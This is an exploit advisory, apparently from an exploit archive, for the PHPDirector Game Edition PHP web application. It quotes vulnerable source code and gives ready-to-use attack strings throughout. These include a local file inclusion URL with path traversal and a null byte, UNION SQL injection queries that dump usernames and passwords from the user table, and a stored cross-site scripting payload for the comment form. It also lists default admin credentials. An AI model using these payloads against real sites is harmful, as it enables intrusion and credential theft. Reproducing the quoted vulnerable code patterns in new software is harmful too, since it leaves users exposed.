@@ -1,0 +1,109 @@
+# Exploit Title: PHPDirector Game Edition Multiple Vulnerabilities (LFI/SQLi/Xss)
+# Date: 2010-01-05
+# Author: Zer0 Thunder
+# Site : http://www.play-online.bzh.be/forum/
+# Version: v0.1
+# Tested on: Windows XP sp2 [WampServer 2.0i] / LinuxBox ( Ubuntu Server 9.10)
+# CVE : 
+# Code :
+
+
+Local File Inclusion !
+
+Header.php Vuln
+-----------------------------
+if(!$_GET["lang"])
+ {
+  include("lang/".config('lang'));
+ }
+else
+ {
+  SetCookie("lang",$_GET["lang"]);
+  header('Location: ' . $_SERVER['HTTP_REFERER'] );    
+ } 
+if (!$_COOKIE["lang"])
+ { 
+  include("lang/".config('lang'));
+ }
+else
+ {
+  $lang = $_COOKIE["lang"];
+  include("lang/" . $lang . ".inc.php");
+ }
+ 
+ -------------------------------
+ 
+ Exploit :
+ http://site.com/path/header.php?header.php?lang=[LFI]
+ 
+ 
+ Sample ( Tested on a windows box)
+ http://localhost/phpdirectorgameedition/header.php?lang=../../../../boot.ini%00
+ 
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ 
+ 
+ 
+ SQL Injection 
+
+Page : Games.php Vuln Page (line 12 / 121 - 128 )
+-----------------------------------------
+	$idc = $_GET["id"];
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+	if(isset($idc) && is_numeric($idc)){
+		$id = mysql_real_escape_string($idc);
+		$result = mysql_query("SELECT * FROM pp_files WHERE id=$id AND `approved` = '1' LIMIT 1") or die(mysql_error());  
+	}else{
+		$result = mysql_query("select * from pp_files WHERE approved='1' AND reject='0' order by rand() LIMIT 1") or die(mysql_error());  
+	}
+	
+-----------------------------------
+## There is also a vuln possiblility on line 27-57
+
+Exploit :
+http://site/games.php?id=-1 UNION SELECT 1,version(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17--
+http://site/games.php?id=-1 UNION SELECT 1,group_concat(id,0x3a,user,0x3a,pass),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17 from pp_user--
+
+
+Example : 
+
+DB Version
+http://localhost/phpdirectorgameedition/games.php?id=-1 UNION SELECT 1,@@version,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17--
+
+Users
+http://localhost/phpdirectorgameedition/games.php?id=-1 UNION SELECT 1,group_concat(id,0x3a,user,0x3a,pass),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17 from pp_user--
+
+# You can't find admin username password in the SQL Database ,It's stroed in config.php
+# line 15-16
+#
+#$cfg["admin_user"] = "admin"; 
+#$cfg["admin_pass"] = "test";
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+XSS ( Cross Site Scripting ) 
+
+You Can even use a Xss Shell on this Vuln
+Goto this page 
+
+http://localhost/phpdirectorgameedition/games.php?id=1
+
+In the comment form put "<script>alert("XSS")</script>" then put a sybmit the comment 
+
+Vuln Code 
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ if(isset($_POST['go']) && !empty($_POST['comment']) && !empty($_POST['nom']))
+{
+mysql_query("INSERT INTO pp_comment (file_id, nom, comment,ip) VALUES ('$_POST[id]', '$_POST[nom]','".addslashes($_POST['comment'])."','$ip')");
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+########################################
+# MSN : zer0_thunder@colombohackers.com
+# Email : neonwarlock@live.com
+# Site : LKHackers.com
+# Greetz : To all my friends
+# Note : Proud to be a Sri Lankan
+# Me : Sri Lankan Hacker
+########################################
